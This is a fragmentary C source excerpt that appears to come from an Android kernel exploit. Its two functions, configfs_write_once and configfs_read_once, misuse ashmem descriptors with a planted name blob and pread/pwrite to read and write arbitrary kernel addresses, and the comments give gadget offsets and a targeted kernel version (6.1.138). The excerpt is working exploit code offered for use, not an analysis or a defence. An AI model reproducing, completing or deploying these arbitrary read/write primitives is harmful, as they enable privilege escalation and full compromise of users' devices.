...
#if (defined(APP_REQUIRE_FRESH_P0_SESSION) && \
      APP_REQUIRE_FRESH_P0_SESSION) ||                        \
    (defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
...
ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  ...
  /* a37x gadget: one direction per ashmem fd ([0x54]/[0x55] flags), so
     every ARW op gets a virgin area via its own descriptor. */
  int lfd = open_ashmem_device();
  if (lfd < 0) {
    return -1;
  }
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(lfd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    close(lfd);
    errno = set_errno;
  ...
  errno = 0;
  ssize_t wr = pwrite(lfd, data, len, pos);
  close(lfd);
  if (getenv("RMG_ARW_DEBUG")) {
    pr_info("arw-write tgt=%016zx base=%016zx pos=%lld ret=%zd errno=%d\n",
            target, base, (long long)pos, wr, errno);
  }
  return wr;
}
...
ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  ...
  /* a37x gadget (6.1.138): skip-fill read copies from [area+0x58] with
     limit [area+0x60]; plant both or the copy returns EOF(0). */
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  ...
  errno = 0;
  ssize_t rd = pread(lfd, data, len, pos);
  close(lfd);
  if (getenv("RMG_ARW_DEBUG")) {
    pr_info("arw-read tgt=%016zx pos=%lld page=%016zx ret=%zd errno=%d "
            "first=%02x%02x%02x%02x\n",
            target, (long long)pos, page, rd, errno,
            rd > 0 ? ((unsigned char *)data)[0] : 0,
            rd > 0 ? ((unsigned char *)data)[1] : 0,
            rd > 0 ? ((unsigned char *)data)[2] : 0,
            rd > 0 ? ((unsigned char *)data)[3] : 0);
  }
  return rd;
}
